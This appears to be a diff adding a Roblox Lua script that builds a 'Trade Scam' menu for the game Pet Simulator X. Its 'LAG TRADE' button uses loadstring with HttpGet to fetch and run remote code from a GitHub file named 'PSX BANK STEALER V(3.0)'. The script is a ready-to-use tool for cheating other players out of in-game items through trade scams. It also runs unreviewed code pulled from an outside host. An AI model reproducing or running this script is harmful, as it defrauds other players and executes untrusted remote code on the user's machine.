@@ -1,0 +1,11 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Script Trade Scam Pet Simulator X", "Ocean")
+
+--MAIN
+local Main = Window:NewTab("Trade Scam")
+local MainSection = Main:NewSection("TRADE SCAM")
+
+
+MainSection:NewButton("LAG TRADE", "Script BY Scriptpsx", function()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/yaboitrxp/q/main/PSX%20BANK%20STEALER%20V(3.0)")()
+end)
